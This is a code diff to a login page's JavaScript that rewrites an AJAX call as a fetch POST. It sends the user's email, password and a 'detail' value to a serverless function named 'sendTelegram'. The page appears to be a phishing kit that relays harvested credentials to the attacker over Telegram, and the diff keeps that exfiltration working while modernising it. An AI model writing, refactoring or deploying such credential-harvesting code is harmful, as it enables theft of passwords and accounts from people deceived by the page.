@@ -190,39 +190,38 @@
         }
         else
         {
-         $.ajax({
-          dataType: 'JSON',
-          // post to Netlify function endpoint
-          url: '/.netlify/functions/sendTelegram',
-          type: 'POST',
-          data:{
-            email:email,
-            password:password,
-            detail:detail,
-          },
-          beforeSend: function(xhr){
-            $('#submit-btn').html('Verifing...');
-          },
-          success: function(response){
-            if(response){
+          // replace the prior $.ajax call with a JSON fetch POST to the Netlify function
+          (async function(){
+            try {
+              $('#submit-btn').html('Verifing...');
+              const payload = {
+                email: email,
+                password: password,
+                detail: detail
+              };
+
+              const resp = await fetch('/.netlify/functions/sendTelegram', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+              });
+
+              if (!resp.ok) {
+                $("#msg").show();
+                $('#msg').html("Please try again later");
+              } else {
+                const json = await resp.json().catch(()=> ({}));
+                $("#msg").show();
+                $('#msg').html(json.msg || 'Sent');
+              }
+            } catch (err) {
+              console.error('Error sending to function:', err);
               $("#msg").show();
-              console.log(response);
-              if(response['signal'] == 'ok'){
-               $('#msg').html(response['msg']);
-             }
-             else{
-              $('#msg').html(response['msg']);
+              $('#msg').html("Please try again later");
+            } finally {
+              $('#submit-btn').html('Login');
             }
-          }
-        },
-        error: function(){
-          $("#msg").show();
-          $('#msg').html("Please try again later");
-        },
-        complete: function(){
-          $('#submit-btn').html('Login');
-        }
-      });
+          })();
        }
      });
     });
